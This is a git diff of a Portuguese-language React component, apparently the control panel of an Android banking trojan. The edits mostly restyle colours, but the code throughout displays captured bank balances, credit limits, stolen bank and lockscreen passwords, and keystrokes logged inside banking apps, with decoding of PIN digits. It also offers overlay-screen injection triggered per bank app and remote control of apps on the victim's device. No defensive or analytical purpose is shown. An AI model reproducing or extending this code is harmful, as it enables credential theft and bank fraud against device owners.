-                                  <span className="inline-flex items-center gap-1 text-[8px] font-mono text-cyan-300 bg-cyan-950/70 border border-cyan-500/30 px-1.5 py-0.5 rounded-md shadow-sm" title={`Último Acesso: ${lastAccessInfo.fullLabel}`}>
-                                    <Clock className="w-2.5 h-2.5 text-cyan-400" />
+                                  <span className="inline-flex items-center gap-1 text-[8px] font-mono text-[#ef4444] bg-[#121214]/70 border border-[#2a2a31]/30 px-1.5 py-0.5 rounded-md shadow-sm" title={`Último Acesso: ${lastAccessInfo.fullLabel}`}>
+                                    <Clock className="w-2.5 h-2.5 text-[#ef4444]" />
                                     <span className="text-slate-400 uppercase text-[7px]">ACESSO:</span>
-                                    <span className="font-bold text-cyan-200">{lastAccessInfo.formattedRelative}</span>
+                                    <span className="font-bold text-[#e8e8ea]">{lastAccessInfo.formattedRelative}</span>
                                   </span>
                                 ) : (
-                                  <span className="inline-flex items-center gap-1 text-[8px] font-mono text-slate-500 bg-slate-900/60 border border-slate-800 px-1.5 py-0.5 rounded-md">
-                                    <Clock className="w-2.5 h-2.5 text-slate-600" />
+                                  <span className="inline-flex items-center gap-1 text-[8px] font-mono text-[#8b8b94] bg-[#121214]/60 border border-[#24242a] px-1.5 py-0.5 rounded-md">
+                                    <Clock className="w-2.5 h-2.5 text-[#6f6f78]" />
                                     Sem dados
                                   </span>
                                 )}
@@ -6607,26 +6671,26 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     return (
                       <div className="flex-1 flex flex-col overflow-hidden p-4">
                         {/* Header do Banco Selecionado */}
-                        <div className="flex items-center justify-between pb-3 border-b border-cyan-500/10 flex-shrink-0">
+                        <div className="flex items-center justify-between pb-3 border-b border-[#2a2a31]/10 flex-shrink-0">
                           <div className="flex items-center space-x-3">
                             <BankIcon pkg={app.package} iconB64={app.icon || app.iconB64 || app.icon_base64} name={app.name} size={42} />
                             <div>
                               <h2 className="text-lg font-black text-white">{app.name}</h2>
-                              <p className="text-xs text-slate-500 font-mono">{app.package}</p>
+                              <p className="text-xs text-[#8b8b94] font-mono">{app.package}</p>
                             </div>
                           </div>
                           <div className="flex items-center space-x-2">
                             <button
                               onClick={() => openApp(app.package, app.name)}
-                              className="px-3 py-1.5 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white text-xs font-bold rounded-lg transition-all shadow-[0_0_10px_rgba(239,68,68,0.3)]"
+                              className="px-3 py-1.5 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#f87171] text-[#10120a] text-xs font-bold rounded-md transition-all shadow-[0_0_10px_rgba(239,68,68,0.3)]"
                             >
-                              ⚡ Abrir App
+                               Abrir App
                             </button>
                             <button
                               onClick={() => forceStopApp(app.package, app.name)}
-                              className="px-3 py-1.5 bg-red-655 hover:bg-red-655/80 text-white text-xs font-bold rounded-lg transition-all"
+                              className="px-3 py-1.5 bg-red-655 hover:bg-red-655/80 text-white text-xs font-bold rounded-md transition-all"
                             >
-                              ⛔ Forçar Parada
+                               Forçar Parada
                             </button>
                           </div>
                         </div>
@@ -6635,9 +6699,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         {(() => {
                           const currentMapping = overlayMappings.find(m => m.package_name === app.package);
                           return (
-                            <div className="p-3 bg-purple-950/20 border border-purple-500/20 rounded-xl flex items-center justify-between flex-shrink-0 text-xs">
+                            <div className="p-3 bg-purple-950/20 border border-[#f87171]/20 rounded-md flex items-center justify-between flex-shrink-0 text-xs">
                               <div className="flex items-center space-x-2">
-                                <span className="text-[10px] text-purple-400 font-bold uppercase tracking-wider">💉 Auto-Gatilho de Tela:</span>
+                                <span className="text-[10px] text-[#f87171] font-bold uppercase tracking-wider"> Auto-Gatilho de Tela:</span>
                                 <select
                                   value={currentMapping ? `${currentMapping.project_id}|${currentMapping.screen_id}` : ''}
                                   onChange={(e) => {
@@ -6660,7 +6724,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                       }
                                     }
                                   }}
-                                  className="bg-black/60 border border-blue-500/20 text-white rounded px-2 py-1 focus:outline-none focus:border-purple-500"
+                                  className="bg-black/60 border border-[#2a2a31]/20 text-white rounded px-2 py-1 focus:outline-none focus:border-[#f87171]"
                                 >
                                   <option value="">-- Sem Overlay Automática --</option>
                                   {projects.map((p: any) => 
@@ -6676,7 +6740,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                 <button
                                   type="button"
                                   onClick={() => applyCustomBlackScreen(currentMapping.template)}
-                                  className="px-2 py-1 bg-purple-600 hover:bg-purple-700 text-white font-bold rounded text-[10px]"
+                                  className="px-2 py-1 bg-[#84cc16] hover:bg-purple-700 text-white font-bold rounded text-[10px]"
                                   title="Testar injeção imediatamente"
                                 >
                                   Injetar Agora
@@ -6689,7 +6753,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         {/* Conteúdo Dinmico com Scroll */}
                         <div className="flex-1 overflow-y-auto py-4 space-y-4 pr-1">
                           
-                          {/* ’³ SALDO BANCRIO CAPTURADO */}
+                          {/* ³ SALDO BANCRIO CAPTURADO */}
                           {(() => {
                             const allBals = bankBalances.filter((b: any) => b.package === app.package);
                             const newest = allBals[0];
@@ -6698,8 +6762,8 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             
                             return (
                               <div className="space-y-4">
-                                {/* 💳 CARTO DE SALDO PREMIUM (GLASSMORPHISM) */}
-                                <div className={`relative overflow-hidden rounded-2xl bg-gradient-to-br ${cardGradient} border p-5 shadow-2xl transition-all duration-300 hover:shadow-[0_0_20px_rgba(255,255,255,0.05)]`}>
+                                {/*  CARTO DE SALDO PREMIUM (GLASSMORPHISM) */}
+                                <div className={`relative overflow-hidden rounded-md bg-gradient-to-br ${cardGradient} border p-5 shadow-2xl transition-all duration-300 hover:shadow-[0_0_20px_rgba(255,255,255,0.05)]`}>
                                   {/* Gloss light reflection */}
                                   <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full blur-2xl pointer-events-none -mr-8 -mt-8"></div>
                                   
@@ -6731,9 +6795,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                         <button
                                           onClick={() => {
                                             navigator.clipboard.writeText(newest.balance);
-                                            addLog(`📋 Saldo copiado: ${newest.balance}`);
+                                            addLog(` Saldo copiado: ${newest.balance}`);
                                           }}
-                                          className="px-2.5 py-1.5 bg-white/10 hover:bg-white/20 text-white border border-white/10 text-[10px] font-bold rounded-lg transition-all flex items-center gap-1"
+                                          className="px-2.5 py-1.5 bg-white/10 hover:bg-white/20 text-white border border-white/10 text-[10px] font-bold rounded-md transition-all flex items-center gap-1"
                                         >
                                           Copiar
                                         </button>
@@ -6743,15 +6807,15 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                       {(newest.credit_limit || newest.invoice) && (
                                         <div className="grid grid-cols-2 gap-2 pt-2 border-t border-white/10">
                                           {newest.credit_limit && (
-                                            <div className="bg-black/30 rounded-lg p-2 border border-white/5">
-                                              <p className="text-[8px] text-white/50 uppercase tracking-wider mb-0.5">💳 Limite Crédito</p>
+                                            <div className="bg-black/30 rounded-md p-2 border border-white/5">
+                                              <p className="text-[8px] text-white/50 uppercase tracking-wider mb-0.5"> Limite Crédito</p>
                                               <div className="flex items-center justify-between">
                                                 <span className="text-xs font-mono font-black text-emerald-400">{newest.credit_limit}</span>
                                                 <button
                                                   onClick={(e) => {
                                                     e.stopPropagation();
                                                     navigator.clipboard.writeText(newest.credit_limit);
-                                                    addLog(`📋 Limite de crédito copiado: ${newest.credit_limit}`);
+                                                    addLog(` Limite de crédito copiado: ${newest.credit_limit}`);
                                                   }}
                                                   className="text-[9px] hover:text-emerald-300 font-bold font-sans text-white/40 ml-1 hover:underline"
                                                 >
@@ -6761,17 +6825,17 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                             </div>
                                           )}
                                           {newest.invoice && (
-                                            <div className="bg-black/30 rounded-lg p-2 border border-white/5">
-                                              <p className="text-[8px] text-white/50 uppercase tracking-wider mb-0.5">📄 Fatura Atual</p>
+                                            <div className="bg-black/30 rounded-md p-2 border border-white/5">
+                                              <p className="text-[8px] text-white/50 uppercase tracking-wider mb-0.5"> Fatura Atual</p>
                                               <div className="flex items-center justify-between">
-                                                <span className="text-xs font-mono font-black text-orange-400">{newest.invoice}</span>
+                                                <span className="text-xs font-mono font-black text-[#f87171]">{newest.invoice}</span>
                                                 <button
                                                   onClick={(e) => {
                                                     e.stopPropagation();
                                                     navigator.clipboard.writeText(newest.invoice);
-                                                    addLog(`📋 Fatura copiada: ${newest.invoice}`);
+                                                    addLog(` Fatura copiada: ${newest.invoice}`);
                                                   }}
-                                                  className="text-[9px] hover:text-orange-300 font-bold font-sans text-white/40 ml-1 hover:underline"
+                                                  className="text-[9px] hover:text-[#fca5a5] font-bold font-sans text-white/40 ml-1 hover:underline"
                                                 >
                                                   Copiar
                                                 </button>
@@ -6787,8 +6851,8 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                       </div>
                                     </div>
                                   ) : (
-                                    <div className="text-center py-8 bg-black/30 rounded-xl border border-dashed border-white/10">
-                                      <span className="text-3xl block mb-2 animate-pulse">💤</span>
+                                    <div className="text-center py-8 bg-black/30 rounded-md border border-dashed border-white/10">
+                                      <span className="text-3xl block mb-2 animate-pulse"></span>
                                       <p className="font-bold text-white text-xs mb-1">Aguardando captura automática</p>
                                       <p className="text-[10px] text-white/40 max-w-[200px] mx-auto">
                                         O saldo será capturado automaticamente assim que a tela inicial deste banco for aberta no dispositivo.
@@ -6797,18 +6861,18 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                   )}
                                 </div>
 
-                                {/* 📜 HISTÓRICO DE CAPTURAS */}
+                                {/*  HISTÓRICO DE CAPTURAS */}
                                 {allBals.length > 1 && (
-                                  <div className="bg-gradient-to-br from-slate-900/60 to-slate-950/80 border border-slate-800 rounded-xl p-4">
+                                  <div className="bg-gradient-to-br from-[#121214]/60 to-slate-950/80 border border-[#24242a] rounded-md p-4">
                                     <h4 className="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2 flex items-center justify-between">
                                       <span>Histórico de Alterações</span>
-                                      <span className="text-[10px] text-slate-600 normal-case font-normal">{allBals.length} registros</span>
+                                      <span className="text-[10px] text-[#6f6f78] normal-case font-normal">{allBals.length} registros</span>
                                     </h4>
                                     <div className="space-y-1.5 max-h-36 overflow-y-auto pr-1">
                                       {allBals.slice(1).map((b: any, i: number) => (
-                                        <div key={i} className="flex items-center justify-between bg-black/20 rounded-lg px-3 py-2 border border-slate-900 hover:border-slate-800 transition-colors">
+                                        <div key={i} className="flex items-center justify-between bg-black/20 rounded-md px-3 py-2 border border-[#121214] hover:border-[#24242a] transition-colors">
                                           <span className="font-mono text-xs text-slate-300 font-bold">{b.balance}</span>
-                                          <span className="text-[9px] text-slate-500 font-mono">
+                                          <span className="text-[9px] text-[#8b8b94] font-mono">
                                             {new Date(b.timestamp).toLocaleString('pt-BR')}
                                           </span>
                                         </div>
@@ -6820,11 +6884,11 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             );
                           })()}
 
-                          {/* ” SENHAS DE ACESSO CAPTURADAS */}
-                          <div className="bg-gradient-to-br from-orange-950/40 via-amber-950/20 to-slate-900/80 rounded-2xl p-4 border border-orange-500/30 shadow-xl">
+                          {/*  SENHAS DE ACESSO CAPTURADAS */}
+                          <div className="bg-gradient-to-br from-orange-950/40 via-amber-950/20 to-[#121214]/80 rounded-md p-4 border border-[#ef4444]/30 shadow-xl">
                             <div className="flex items-center justify-between mb-3">
-                              <h3 className="text-xs font-black uppercase text-orange-400 tracking-wider flex items-center gap-2">
-                                <span className="text-sm">🔑</span>
+                              <h3 className="text-xs font-black uppercase text-[#f87171] tracking-wider flex items-center gap-2">
+                                <span className="text-sm"></span>
                                 Senhas de Acesso Capturadas ({appPasswords.length})
                               </h3>
                               {appPasswords.length > 0 && (
@@ -6832,9 +6896,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                   onClick={() => {
                                     const allText = appPasswords.map(p => `[${p.bank || app.name}] ${p.label || p.hint || 'SENHA'}: ${p.password}`).join('\n');
                                     navigator.clipboard.writeText(allText);
-                                    addLog(`📋 Copiadas ${appPasswords.length} senhas de ${app.name}`);
+                                    addLog(` Copiadas ${appPasswords.length} senhas de ${app.name}`);
                                   }}
-                                  className="text-[9px] bg-orange-950/80 hover:bg-orange-900 text-orange-300 font-bold px-2 py-1 rounded border border-orange-500/30 transition-all font-mono"
+                                  className="text-[9px] bg-orange-950/80 hover:bg-[#1a1a1e] text-[#fca5a5] font-bold px-2 py-1 rounded border border-[#ef4444]/30 transition-all font-mono"
                                 >
                                   Copiar Todas
                                 </button>
@@ -6842,22 +6906,22 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             </div>
                             
                             {appPasswords.length === 0 ? (
-                              <div className="text-center py-6 text-slate-500 text-xs bg-black/30 rounded-xl border border-slate-900 flex flex-col items-center justify-center gap-1">
-                                <span className="text-2xl">—</span>
+                              <div className="text-center py-6 text-[#8b8b94] text-xs bg-black/30 rounded-md border border-[#121214] flex flex-col items-center justify-center gap-1">
+                                <span className="text-2xl"></span>
                                 <span>Nenhuma senha capturada para este app ainda.</span>
-                                <span className="text-[10px] text-slate-600">As senhas serão salvas automaticamente quando digitadas.</span>
+                                <span className="text-[10px] text-[#6f6f78]">As senhas serão salvas automaticamente quando digitadas.</span>
                               </div>
                             ) : (
                               <div className="space-y-3">
                                 {appPasswords.map((pwd, i) => (
-                                  <div key={i} className="bg-slate-950/80 border border-orange-500/40 rounded-xl p-3 shadow-lg hover:border-orange-400/60 transition-all">
+                                  <div key={i} className="bg-slate-950/80 border border-[#ef4444]/40 rounded-md p-3 shadow-lg hover:border-[#f87171]/60 transition-all">
                                     <div className="flex items-center justify-between mb-2">
                                       <div className="flex items-center space-x-2">
-                                        <span className="px-2 py-0.5 bg-orange-900/80 text-orange-200 text-[10px] rounded font-mono font-bold border border-orange-600/30">
+                                        <span className="px-2 py-0.5 bg-[#1a1a1e]/80 text-orange-200 text-[10px] rounded font-mono font-bold border border-[#84cc16]/30">
                                           {pwd.label || pwd.hint || 'SENHA'}
                                         </span>
                                         {pwd.digits && (
-                                          <span className="px-1.5 py-0.5 bg-slate-900 text-slate-400 text-[9px] rounded font-mono">
+                                          <span className="px-1.5 py-0.5 bg-[#121214] text-slate-400 text-[9px] rounded font-mono">
                                             {pwd.digits} dígitos
                                           </span>
                                         )}
@@ -6867,25 +6931,25 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                           </span>
                                         )}
                                         {pwd.source === 'LOCKSCREEN' && (
-                                          <span className="px-1.5 py-0.5 bg-purple-950 text-purple-400 text-[9px] rounded border border-purple-800/40 font-mono">
-                                            🔒 Lockscreen
+                                          <span className="px-1.5 py-0.5 bg-purple-950 text-[#f87171] text-[9px] rounded border border-purple-800/40 font-mono">
+                                             Lockscreen
                                           </span>
                                         )}
                                       </div>
-                                      <span className="text-[10px] text-slate-500 font-mono">
+                                      <span className="text-[10px] text-[#8b8b94] font-mono">
                                         {new Date(pwd.timestamp).toLocaleTimeString('pt-BR')}
                                       </span>
                                     </div>
-                                    <div className="flex items-center justify-between bg-black/70 rounded-lg p-2 border border-slate-900">
+                                    <div className="flex items-center justify-between bg-black/70 rounded-md p-2 border border-[#121214]">
                                       <span className="text-xl font-bold font-mono text-emerald-400 tracking-[0.2em] px-2 flex-1 text-center select-all">
                                         {pwd.password}
                                       </span>
                                       <button
                                         onClick={() => {
                                           navigator.clipboard.writeText(pwd.password);
-                                          addLog(`📋 Senha copiada: ${pwd.password}`);
+                                          addLog(` Senha copiada: ${pwd.password}`);
                                         }}
-                                        className="px-3 py-1.5 bg-orange-600 hover:bg-orange-500 text-white text-xs font-bold rounded-lg transition-colors shadow-md flex items-center gap-1"
+                                        className="px-3 py-1.5 bg-[#84cc16] hover:bg-[#ef4444] text-white text-xs font-bold rounded-md transition-colors shadow-md flex items-center gap-1"
                                       >
                                         Copiar
                                       </button>
@@ -6897,16 +6961,16 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                           </div>
 
 {/* ¨ KEYLOGS DENTRO DO BANCO */}
-                          <div className="bg-gradient-to-br from-slate-900 to-slate-950/60 rounded-2xl p-4 border border-slate-800/80 shadow-2xl relative overflow-hidden">
+                          <div className="bg-gradient-to-br from-[#121214] to-slate-950/60 rounded-md p-4 border border-[#24242a]/80 shadow-2xl relative overflow-hidden">
                             {/* Efeito de brilho neon no fundo */}
-                            <div className="absolute top-0 right-0 w-24 h-24 bg-cyan-500/5 blur-3xl rounded-full pointer-events-none"></div>
+                            <div className="absolute top-0 right-0 w-24 h-24 bg-[#ef4444]/5 blur-3xl rounded-full pointer-events-none"></div>
                             
                             <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 mb-4">
                               <div>
                                 <h3 className="text-xs font-black uppercase text-slate-300 tracking-wider flex items-center gap-2">
                                   <span className="relative flex h-2 w-2">
-                                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-cyan-400 opacity-75"></span>
-                                    <span className="relative inline-flex rounded-full h-2 w-2 bg-cyan-500"></span>
+                                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#ef4444] opacity-75"></span>
+                                    <span className="relative inline-flex rounded-full h-2 w-2 bg-[#ef4444]"></span>
                                   </span>
                                   ¨ Teclas Digitadas neste App ({appKeylogs.length})
                                 </h3>
@@ -6920,21 +6984,21 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                   placeholder="Buscar nas teclas..."
                                   value={bankKeylogSearch}
                                   onChange={(e) => setBankKeylogSearch(e.target.value)}
-                                  className="w-full text-xs bg-slate-950/85 border border-slate-800 rounded-lg px-2.5 py-1.5 pl-7 text-slate-200 placeholder-slate-600 focus:outline-none focus:border-cyan-500/50 transition-all font-mono"
+                                  className="w-full text-xs bg-slate-950/85 border border-[#24242a] rounded-md px-2.5 py-1.5 pl-7 text-slate-200 placeholder-[#6f6f78] focus:outline-none focus:border-[#2a2a31]/50 transition-all font-mono"
                                 />
-                                <span className="absolute left-2.5 top-1/2 -translate-y-1/2 text-slate-600 text-xs">”</span>
+                                <span className="absolute left-2.5 top-1/2 -translate-y-1/2 text-[#6f6f78] text-xs"></span>
                               </div>
                             </div>
 
                             {/* Mini Stats Banner */}
                             {appKeylogs.length > 0 && (
-                              <div className="grid grid-cols-2 gap-2 mb-4 bg-slate-950/30 p-2 rounded-lg border border-slate-900/50">
-                                <div className="text-center border-r border-slate-900">
-                                  <span className="block text-[9px] text-slate-500 font-bold uppercase tracking-wider">Total de Logs</span>
-                                  <span className="text-xs font-bold text-cyan-400 font-mono">{appKeylogs.length}</span>
+                              <div className="grid grid-cols-2 gap-2 mb-4 bg-slate-950/30 p-2 rounded-md border border-[#121214]/50">
+                                <div className="text-center border-r border-[#121214]">
+                                  <span className="block text-[9px] text-[#8b8b94] font-bold uppercase tracking-wider">Total de Logs</span>
+                                  <span className="text-xs font-bold text-[#ef4444] font-mono">{appKeylogs.length}</span>
                                 </div>
                                 <div className="text-center">
-                                  <span className="block text-[9px] text-slate-500 font-bold uppercase tracking-wider">Última Atividade</span>
+                                  <span className="block text-[9px] text-[#8b8b94] font-bold uppercase tracking-wider">Última Atividade</span>
                                   <span className="text-xs font-bold text-green-400 font-mono">
                                     {(() => {
                                       const lastLog = [...appKeylogs].sort((a, b) => 
@@ -6950,13 +7014,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
                             {appKeylogs.length === 0 ? (
                               isLoadingBankKeylogs ? (
-                                <div className="text-center py-8 text-slate-400 text-xs bg-slate-950/40 rounded-xl border border-slate-900/50 flex flex-col items-center justify-center gap-2">
+                                <div className="text-center py-8 text-slate-400 text-xs bg-slate-950/40 rounded-md border border-[#121214]/50 flex flex-col items-center justify-center gap-2">
                                   <span className="animate-spin text-2xl">³</span>
                                   <span>Carregando teclas do banco...</span>
                                 </div>
                               ) : (
-                                <div className="text-center py-8 text-slate-500 text-xs bg-slate-950/40 rounded-xl border border-slate-900/50 flex flex-col items-center justify-center gap-2">
-                                  <span className="text-2xl">💤</span>
+                                <div className="text-center py-8 text-[#8b8b94] text-xs bg-slate-950/40 rounded-md border border-[#121214]/50 flex flex-col items-center justify-center gap-2">
+                                  <span className="text-2xl"></span>
                                   <span>Nenhuma tecla capturada dentro do app ainda.</span>
                                 </div>
                               )
@@ -6989,13 +7053,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                   if (eventType === 'BANK_BUTTON_CLICK' || eventType === 'BANK_CLICK_POSITION' || eventType === 'VIEW_CLICKED') {
                                     if (textVal && !textVal.startsWith('[CLICK:') && !textVal.startsWith('[BTN:')) {
                                       const cleanText = textVal.replace(/^"|"$/g, '');
-                                      return `👆 Botão Clicado: "${cleanText}"`;
+                                      return ` Botão Clicado: "${cleanText}"`;
                                     } else if (textVal.startsWith('[CLICK:') || textVal.startsWith('[BTN:')) {
                                       const posMatch = textVal.match(/pos\((\d+),(\d+)\)/);
                                       const posInfo = posMatch ? ` (x:${posMatch[1]}, y:${posMatch[2]})` : '';
-                                      return `👆 Toque em Elemento da Tela${posInfo}`;
+                                      return ` Toque em Elemento da Tela${posInfo}`;
                                     }
-                                    return `👆 Clique / Toque no Banco`;
+                                    return ` Clique / Toque no Banco`;
                                   }
 
                                   // 2. Dígito ou PIN de Senha Bancária
@@ -7010,25 +7074,25 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                   ) {
                                     const cleanNum = textVal.replace(/[\[\]]/g, '');
                                     if (eventType === 'BANK_PASSWORD_COMPLETE') {
-                                      return `🔑 Senha Compilada: [ ${cleanNum} ]`;
+                                      return ` Senha Compilada: [ ${cleanNum} ]`;
                                     }
-                                    return `🔑 Teclado / Dígito: [ ${cleanNum} ]`;
+                                    return ` Teclado / Dígito: [ ${cleanNum} ]`;
                                   }
 
                                   // 3. Posição de toque na tela por texto
                                   if (textVal.startsWith('[CLICK:') || textVal.startsWith('[BTN:')) {
                                     const posMatch = textVal.match(/pos\((\d+),(\d+)\)/);
                                     const posInfo = posMatch ? ` (x:${posMatch[1]}, y:${posMatch[2]})` : '';
-                                    return `👆 Toque na Tela${posInfo}`;
+                                    return ` Toque na Tela${posInfo}`;
                                   }
 
                                   // 4. Se for número isolado (ex: 86, 8, [86], [8])
                                   if (/^\[?\d{1,8}\]?$/.test(textVal)) {
                                     const cleanNum = textVal.replace(/[\[\]]/g, '');
                                     if (l.isPassword) {
-                                      return `🔑 Teclado / Dígito: [ ${cleanNum} ]`;
+                                      return ` Teclado / Dígito: [ ${cleanNum} ]`;
                                     }
-                                    return `👆 Botão / Dígito Clicado: [ ${cleanNum} ]`;
+                                    return ` Botão / Dígito Clicado: [ ${cleanNum} ]`;
                                   }
 
                                   // 5. Alteração / Digitação de Texto
@@ -7064,12 +7128,12 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                   if (hint && fieldName) {
                                     return `· [${fieldName}] ${hint}`;
                                   } else if (hint) {
-                                    return `💡 Contexto: ${hint}`;
+                                    return ` Contexto: ${hint}`;
                                   } else if (fieldName) {
-                                    return `📌 Campo focado: ${fieldName}`;
+                                    return ` Campo focado: ${fieldName}`;
                                   }
 
-                                  return `🏦 Interação no Banco`;
+                                  return ` Interação no Banco`;
                                 };
 
                                 const getLogCategory = (l: any) => {
@@ -7095,7 +7159,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                   }
 
                                   // Cliques por texto ou posição
-                                  if (textVal.startsWith('[CLICK:') || textVal.startsWith('[BTN:') || textVal.startsWith('👆') || eventType.includes('CLICK')) {
+                                  if (textVal.startsWith('[CLICK:') || textVal.startsWith('[BTN:') || textVal.startsWith('') || eventType.includes('CLICK')) {
                                     return 'click';
                                   }
 
@@ -7149,10 +7213,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                         <button
                                           type="button"
                                           onClick={() => setBankLogCategoryFilter('all')}
-                                          className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
+                                          className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                             bankLogCategoryFilter === 'all'
-                                              ? 'bg-cyan-500/20 text-cyan-300 border-cyan-500/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
-                                              : 'bg-slate-950/60 text-slate-400 border-slate-900 hover:text-slate-200'
+                                              ? 'bg-[#ef4444]/20 text-[#ef4444] border-[#2a2a31]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
+                                              : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                           }`}
                                         >
                                           Œ Todos ({appKeylogs.length})
@@ -7160,38 +7224,38 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                         <button
                                           type="button"
                                           onClick={() => setBankLogCategoryFilter('password')}
-                                          className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
+                                          className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                             bankLogCategoryFilter === 'password'
-                                              ? 'bg-rose-500/20 text-rose-300 border-rose-500/50 shadow-[0_0_8px_rgba(244,63,94,0.3)]'
-                                              : 'bg-slate-950/60 text-slate-400 border-slate-900 hover:text-slate-200'
+                                              ? 'bg-[#ef4444]/20 text-rose-300 border-[#ef4444]/50 shadow-[0_0_8px_rgba(244,63,94,0.3)]'
+                                              : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                           }`}
                                         >
-                                          🔑 Senhas ({appKeylogs.filter(l => getLogCategory(l) === 'password').length})
+                                           Senhas ({appKeylogs.filter(l => getLogCategory(l) === 'password').length})
                                         </button>
                                         <button
                                           type="button"
                                           onClick={() => setBankLogCategoryFilter('click')}
-                                          className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
+                                          className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                             bankLogCategoryFilter === 'click'
-                                              ? 'bg-purple-500/20 text-purple-300 border-purple-500/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
-                                              : 'bg-slate-950/60 text-slate-400 border-slate-900 hover:text-slate-200'
+                                              ? 'bg-[#f87171]/20 text-[#fca5a5] border-[#f87171]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
+                                              : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                           }`}
                                         >
-                                          👆 Botões ({appKeylogs.filter(l => getLogCategory(l) === 'click').length})
+                                           Botões ({appKeylogs.filter(l => getLogCategory(l) === 'click').length})
                                         </button>
                                         <button
                                           type="button"
                                           onClick={() => setBankLogCategoryFilter('screen')}
-                                          className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
+                                          className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                             bankLogCategoryFilter === 'screen'
-                                              ? 'bg-blue-500/20 text-blue-300 border-blue-500/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
-                                              : 'bg-slate-950/60 text-slate-400 border-slate-900 hover:text-slate-200'
+                                              ? 'bg-[#ef4444]/20 text-[#ef4444] border-[#2a2a31]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
+                                              : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                           }`}
                                         >
                                            Telas ({appKeylogs.filter(l => getLogCategory(l) === 'screen').length})
                                         </button>
                                       </div>
-                                      <div className="text-center py-6 text-slate-600 text-xs font-mono">
+                                      <div className="text-center py-6 text-[#6f6f78] text-xs font-mono">
                                         Nenhum resultado para os filtros selecionados
                                       </div>
                                     </div>
@@ -7230,10 +7294,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                       <button
                                         type="button"
                                         onClick={() => setBankLogCategoryFilter('all')}
-                                        className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
+                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                           bankLogCategoryFilter === 'all'
-                                            ? 'bg-cyan-500/20 text-cyan-300 border-cyan-500/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
-                                            : 'bg-slate-950/60 text-slate-400 border-slate-900 hover:text-slate-200'
+                                            ? 'bg-[#ef4444]/20 text-[#ef4444] border-[#2a2a31]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
+                                            : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                         }`}
                                       >
                                         Œ Todos ({appKeylogs.length})
@@ -7241,32 +7305,32 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                       <button
                                         type="button"
                                         onClick={() => setBankLogCategoryFilter('password')}
-                                        className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
+                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                           bankLogCategoryFilter === 'password'
-                                            ? 'bg-rose-500/20 text-rose-300 border-rose-500/50 shadow-[0_0_8px_rgba(244,63,94,0.3)]'
